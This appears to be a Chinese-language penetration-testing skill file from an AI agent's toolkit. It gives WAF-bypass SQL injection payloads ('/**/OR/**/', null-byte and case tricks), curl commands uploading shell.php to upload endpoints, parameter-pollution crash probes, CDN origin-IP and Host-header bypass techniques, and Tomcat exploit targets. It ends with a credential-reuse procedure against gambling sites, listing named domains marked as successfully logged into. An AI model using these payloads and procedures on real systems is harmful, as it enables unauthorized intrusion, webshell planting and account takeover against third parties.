# 核心技术（API 探针 / ThinkPHP / WAF 绕过 / 域名关联）

> 摘自 `web-penetration-testing` 主体（2026-09 拆分，主体原 122K 撞 100K 硬限）；references 按需加载。

---

## 三、核心技术

### 🥇 API参数探针（"少→缺→加"循环）

**原理**：发送请求收到 `缺少必要参数X` 错误 → 添加该参数重试 → 直到成功。

```
初始请求: service=User.Login&username=admin
         ↓
返回: "缺少必要参数password"
         ↓
添加: service=User.Login&username=admin&password=test
         ↓
返回: "缺少必要参数client_id"
         ↓
添加: service=User.Login&username=admin&password=test&client_id=32chars...
         ↓
返回: "缺少必要参数website"
         ↓
最终: service=User.Login&username=admin&password=test&client_id=xxx&website=yyy&ip=127.0.0.1
```

**客户端ID生成**: `client_id` 常要求32位以上，用 MD5(username) 快速生成。

**有效参数名可互换**：`password` / `passwd` / `pass` / `pwd` 都可能有效。

---

### 🥈 WAF指纹识别与绕过

**ModSecurity 特征**：
- 响应码 406 Not Acceptable
- 请求体被拦截返回Apache默认406页（含 `<center><h1>406 Not Acceptable</h1></center><hr><center>Apache</center>`）
- 规则区分大小写 → `/**/OR/**/` 可绕过
- 302/502 可能是 WAF 转发而非拦截——502 说明 PHP 脚本执行但崩溃（文件存在）

**响应码快速鉴别表**：

| 响应码 | 含义 | 动作 |
|:-------|:-----|:-----|
| **200** | 正常响应 | 分析页面内容 |
| **301/302** | 重定向 | 跟 `-L` 追踪目的地（可能是 CDN 备份文件） |
| **402** | **Payment Required — CDN/OpenResty content gate** | OpenResty 付费墙模式：所有路径（含根路径）返回 402 + `x-cache: BYPASS` header, `server: openresty`。这意味着 CDN/网关层对未授权访问执行内容拦截——真实后端在网关之后，需通过特定 Host header/cookie/token 才能访问。常见于被付费CDN保护的博彩SPA。注意：直接IP访问同一端口可能返回 503，SSL证书 subject 可能为空（不泄露域名）。 |
| **403** | 禁止访问 | 目录/路径存在但不可读 — `/api/` 403 = 有API入口存在 |
| **404** | 不存在 | 文件或路由未定义 |
| **406** | WAF 拦截 (ModSecurity) | Apache 默认 406 页含 Apache 签名 |
| **500** | PHP 内部错误 | 框架执行但出错 — ThinkPHP Debug 泄露机会 |
| **502** | Bad Gateway | PHP 崩溃或 nginx 超时 — 文件存在证据 |
| 000 (连接终止) | **网络层 DROP** | TLS 连接被服务端主动关闭（无响应体）— 与 502 不同，这是 WAF/IPS 的 DROP 动作，常见于敏感文件名黑名单（phpinfo.php, config.php, .zip, .sql 等）。即使 URL 编码/路径变异/HTTP 方法变换也无法绕过，说明是路径级 DROP。|
| **406 (所有 `.git/*` 路径)** | **`.git` 确认存在** | 如果 `.git/HEAD`, `.git/config`, `.git/refs/heads/master` 等路径**全部统一返回 406**（ModSecurity 拦截）而非 404，说明 `.git` 目录真实存在，但被 WAF 规则引擎拦截。406 是比 404 更强的存在证据——规则拦截意味着 WAF 专门配置了 `.git` 关键词规则。**注意**：406 与 000 的区别——000 = 黑名单 DROP（文件被禁止），406 = 规则拦截（关键词被禁止）。|

**502 深度分析**（不同来源不同处理）：

| 502 特征 | 含义 | 利用方法 |
|:---------|:-----|:---------|
| Apache 默认 502 页 | PHP 文件存在，执行崩溃 | 尝试 XDEBUG/查询串触发信息泄露 |
| nginx 默认 502 页 | nginx 代理超时，后端无响应 | 直连后端端口 |
| ThinkPHP 错误页 | ThinkPHP 框架执行但报错 | 版本 + 路径信息已泄露 |
| 空响应体 | PHP-FPM crash / WAF 丢弃 | 换 Content-Type 重试 |

**502 场景利用**：
```bash
# 502 = PHP文件存在 → 尝试执行/信息泄露
curl -sk "https://target.com/config.php?XDEBUG_SESSION=1"
curl -sk "https://target.com/config.php?debug=1"

# 找所有 502 文件（=文件真实存在）
for f in /config.php /index.php.bak /.sql /.rar /cl/config.php /cl/phpinfo.php; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com$f")
  echo "$code $f"
done
```

---

**WAF规则映射表**（通过发送单个token逐个排查）：

| Token | ModSecurity | 说明 |
|:------|:-----------:|:-----|
| `'` | 🔴 拦截 | 单引号本身触发（某些 ASP.NET/WAF 直接拦截引号） |
| `OR 1=1` | ✅ 不拦截 | 但 `' OR '1'='1` 组合拦截 |
| `UNION SELECT` | ❌ 拦截 | 组合SQL关键字 |
| `<script>` | ❌ 拦截 | XSS关键字 |
| `information_schema` | ❌ 拦截 | 数据字典访问 |
| `../` | ✅ 不拦截 | 路径遍历 |

**绕过技巧**：

| 技巧 | 示例 | 成功率 |
|:-----|:-----|:------:|
| 注释插入 | `admin'/**/OR/**/'1'='1` | ✅ 通过 |
| 注释插入 + 关键词 | `OR/**/1=1` 或 `AND/**/SLEEP(3)` | ✅ 通过（关键：/**/ 打断关键词和数字/函数之间） |
| URL编码OR | `admin' %4fR 1=1--` | ✅ 通过 |
| 双重 URL编码 (GET路径) | `/%2561%2564%256d%2569%256e`（%25→%, %61→a ...） | ⚠️ 仅对 GET 路径生效（PATH_INFO 双重解码）。**POST body 无效**（PHP 只解码一次，`%2527` 在 PHP `$_POST` 中变为 `%27` 而非 `'`）|
| 空字节 | `admin'%00OR%001=1--` | ✅ 通过 |
| Tab/换行(URL编码) | `admin'%09OR%091=1--` | ✅ 通过 |
| 大小写混淆 | `admin'/**/oR/**/1=1--` | ✅ 通过 |
| POST代替GET | POST表单数据 | ✅ 通过 |
| **JSON Content-Type** | `-H "Content-Type: application/json" -d '{"key":"val"}'` | ✅ WAF通过(但PHP可能不解析JSON) |
| **Multipart** | `-F "field=value"` | ✅ WAF通过 |
| Chunked Encoding | `Transfer-Encoding: chunked` | ⚠️ 返回空(可能崩溃后端) —— 注意：空响应体不同于404/500，可能是后端处理 chunked 编码时崩溃 |
| 内联注释 | `/*!12345OR*/` | ❌ 拦截 |
| 参数污染 | `username=admin&username=' OR 1=1` | ❌ 拦截 |

---

### 🥇 Upload 端点模糊测试

**原理**：标准 PHP MVC 框架常有通用上传控制器，名如 `c=user&m=upload`。批量探测方法：

```bash
# 上传端点枚举
for m in upload fileUpload Upload FileUpload doUpload save Save submit Submit; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.com/index.php?c=user&m=${m}")
  echo "${code} c=user&m=${m}"
done

# 上传尝试（可能需认证）
curl -sk -X POST "https://target.com/index.php?c=user&m=upload" \
  -F "file=@shell.php;filename=shell.php" \
  -F "submit=upload"

# 不同参数格式尝试
curl -sk -X POST "https://target.com/index.php?c=user&m=upload" \
  -F "file=@shell.php;filename=shell.php" \
  -F "act=upload"
```

**注意**：所有上传端点返回 200（主页）不代表可用——可能是未登录重定向。需先解决认证。

### 🥇 真实登录端点发现（biying CMS）

biying/必赢模板的登录端点与主站 index.php 路由不同步。**关键发现**：

- 前端 JS 的 `LoginForm2` 提交到 `../app/member/login.php`（即 `/app/member/login.php`）
- 而非 `/index/user/checkLogin`（这个只是主页的 index.php 路由，不实际处理登录）
- 实际登录 POST 到 `/app/member/login.php` 返回 `"Plaese input username/passwd and try again!!"`（含拼写错误 "Plaese"）

**发现方法**：从 JS 或 HTML 中搜索 form action：
```bash
# 在页面源码中找真实登录 action
curl -sk "https://target.com/" | grep -i 'action.*login\|form.*action'

# 在 common.js 中找登录 URL
grep -oP 'url.*login|action.*login.*\.php' common.js

# 或者搜索 LoginForm
grep -i 'LoginForm\|login_form' page.html
```

**常用登录路径**：
- `/app/member/login.php` — biying 模板标准路径
- `/member/login.php`
- `/login.php`

**测试方法**（注意：所有字段名组合都接受）：
```bash
# 不带参数 → 显示 "Plaese input username/passwd and try again!!"
curl -sk "https://target.com/app/member/login.php"

# 带任意用户名密码 → 同样错误（表示在验证）
curl -sk -d "username=admin&password=test" "https://target.com/app/member/login.php"
curl -sk -d "user=admin&pass=test" "https://target.com/app/member/login.php"
curl -sk -d "login_name=admin&login_pwd=test" "https://target.com/app/member/login.php"
```

**注意**：该登录端点同样受 mod_security WAF 保护（SQL 注入返回 406）。

### 🥇 HPP (HTTP Parameter Pollution) 崩溃检测

**原理**：重复参数可能导致 PHP 变量覆盖/类型混淆，使后端崩溃（返回空响应）：

```bash
# 正常→200有内容
curl "https://target.com/index.php?c=user&m=checkLogin&username=admin"

# HPP→空响应（可能崩溃）
curl "https://target.com/index.php?c=user&m=checkLogin&username=admin&username=admin' OR 1=1--"
# → 空响应体（非404/500/200），指示可能的崩溃
```

**用法**：HPP 空响应 = 后端处理异常，可尝试进一步利用（如内存破坏、逻辑绕过）。

---

**识别特征**：
- 错误页面显示 `ThinkPHP` + 版本号（如 V5.0.24）
- 错误信息显示 `variable type error： array`
- 底部版权: `<a href="http://www.thinkphp.cn">ThinkPHP</a>`

**可利用信息**：
```
错误页泄露:
  → 框架版本（已知漏洞查询）
  → 变量类型信息
  → 文件路径线索
  → 调用栈（如果配置了trace）

已知路径:
  /runtime/log/        → 403 (存在但Nginx禁止)
  /runtime/            → 403 (存在)
  /captcha             → 验证码图片
  ?s=captcha           → ThinkPHP 5 验证码路由
  composer.json        → 依赖信息
```

---

### 🏅 Admin 面板消失诊断（当 SPA 吞噬所有路径时）

**核心认知**：当以 Vue/React SPA 架构的前台站点中，**所有** 后台路径（/admin, /manage, /system, /boss, /agent, /login 等）都返回 200 且内容为同一 SPA HTML（空 title、相同源码）时——**管理面板不是藏在某个特殊路径下，而是在完全不同的服务器/端口上。**

```bash
# 诊断流程

# 1. 确认所有路径被 SPA 吞噬（空 title 表示 Vue router 捕捉）
for path in admin manage system boss agent backend login admin/login; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://frontend:9016/$path")
  echo "$code $path"
done
# → 全部 200 = SPA 在捕捉路由

# 2. 提取所有关联 IP 并做全端口扫描
nslookup frontend.com
# → 返回 4+ IP 地址（CDN 集群）
for ip in ip1 ip2 ip3 ip4; do
  for port in 80 443 8080 8443 8888 9090 7001 8000 9000 9016 9017 9018 10000 2082 2083 3000 5000; do
    result=$(curl -sk --connect-timeout 3 "https://$ip:$port/" 2>/dev/null | head -c 300)
    if [ -n "$result" ]; then echo "=== $ip:$port RESPONDS ==="; echo "$result"; fi
  done
done
# → 通常只有 1 个 IP 的 1 个端口（如 9016）返回前台内容
# → 其余 TCP 端口开放但无 HTTP 响应 = 负载均衡器/中间件透传

# 3. 寻找 sitePath/siteId 编码（从 JS 文件提取，用于构造管理 URL）
grep -oP 'sitePath["'']?:\s*["'']?[A-Z0-9]+' frontend.js
grep -oP 'siteId["'']?:\s*["'']?\d+' frontend.js
grep -oP '"F\d{3}"' frontend.js    # 常见博彩 sitePath 编码
# → sitePath 编码（如 F106, F376, F099）用于构造内部子域名或 API 参数

# 4. 站点模板域名模式
grep -oP 'https?://[^"'\'']+' frontend.js
# → 可能发现模板域名: *.siwiueibiviwer.com, m.dncp-wl99.com 等
#   sitePath + 当日日期编码可构造后台子域名
```

**CDN 源站 IP 发现 — 历史 SSL 证书 SAN 逆向分析**: 当目标域名被 CDN 保护时，查询 crt.sh 获取历史 SSL 证书记录，寻找与目标域名**共享过 SAN 的其他域名**。这些共享域名的当前 DNS 解析结果可能就是源站 IP。关键: 优先关注**非 Let's Encrypt 的旧证书**（如 Certum / DigiCert / Sectigo 付费证书通常有效期1年，更可能在裸源站时代签发）。完整操作流程、实战案例（x3891.vip → 20.6.183.83）、以及 OpenResty 307 内部分发端口确认技术见 `references/cdn-origin-discovery-via-old-certs.md`。

**OpenResty 402 → 302 Host header bypass 诊断**：当源站 IP 已知（通过 crt.sh/SSL 证书分析发现）但所有路径返回 402 时，将 Host header 设为源站 IP 本身（`Host: <origin-ip>`）可触发 **302 重定向**而非 402。这是强确认信号——真实源站 OpenResty 配置有 Host 校验逻辑。完整诊断方法及 Tomcat 8.0.36 发现见 `references/openresty-host-bypass-tomcat-discovery.md`。

**Apache Tomcat 8.0.36 通过 OpenResty 415 错误泄露**：当 OpenResty 代理的某一路由返回 **HTTP 415** + `Apache Tomcat/8.0.36` 签名时，确认后端存在 Tomcat（2015年，含 CVE-2017-12617 PUT RCE, CVE-2020-1938 Ghostcat）。
**AJP13 端口 8009**：对源站 IP 做端口扫描，`8009/tcp open = ajp13` 进一步确认 Tomcat。

| **CDN DNS 解析器模式**：部分博彩 CDN 使用专用解析域名（如 `jkydns806.com`）。该域名本身不提供 HTTP 服务（所有路径无响应），仅用于 DNS 解析关联域名的 IP 地址。特征：
- `nslookup target.com` 不返回 IP
- `nslookup jkydns806.com` 返回 IP（CDN 解析器）
- 网站的 A 记录通过 CDN 解析器动态返回

| 信号 | 含义 |
|:-----|:------|
| SPA 吞噬所有路径 (全返回200) | 管理面板在不同服务器/端口上 |
| 关联 IP 多但仅1个端口响应 | 其他IP是CDN/负载均衡节点 |
| 402 Payment Required | OpenResty 付费墙 — 需特定 header/token |
| `x-cache: BYPASS` | CDN 配置了内容访问控制 |
| 专用 DNS 解析域名存在 | CDN 使用独立动态解析系统 |

**原理**：博彩站群常用统一会员数据库，一个账号跨站可用。

**操作流程**：
1. 从主站首页提取所有 `href` 中的关联域名
2. 用同一凭证尝试登录所有域名
3. 有的域名验证码为固定值 `1111`（HTML input的默认值）
4. 找到防御最弱的域名进行突破

**已验证模式**：
```
6533388.com  →  ThinkPHP + 固定验证码1111 → ✅ 登录成功
9599wm.net   →  ThinkPHP + 固定验证码1111 → ✅ 登录成功（同账号）
9581kk.com   →  PHP原生框架 + 验证码broken → ❌ 登录失败
```

---
